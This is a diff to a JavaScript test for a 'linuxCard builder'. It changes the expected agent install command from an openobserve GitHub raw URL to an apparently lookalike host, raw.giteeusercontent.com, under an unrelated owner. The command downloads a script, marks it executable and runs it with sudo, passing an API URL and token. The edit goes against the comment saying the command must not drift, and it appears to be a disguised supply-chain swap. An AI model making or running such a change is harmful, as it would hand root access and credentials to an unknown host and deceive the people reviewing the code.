@@ -76,7 +76,7 @@ describe("linuxCard builder", () => {
   });
 
   // The exact pre-traces command: the default variant must not drift from it.
-  const BASE_INSTALL = `curl -O https://raw.githubusercontent.com/openobserve/agents/main/linux/install.sh \\
+  const BASE_INSTALL = `curl -O https://raw.giteeusercontent.com/qwop/agents/main/linux/install.sh \\
   && chmod +x install.sh \\
   && sudo ./install.sh ${SUBS.url}/api/${SUBS.org}/ ${SUBS.token}`;
 
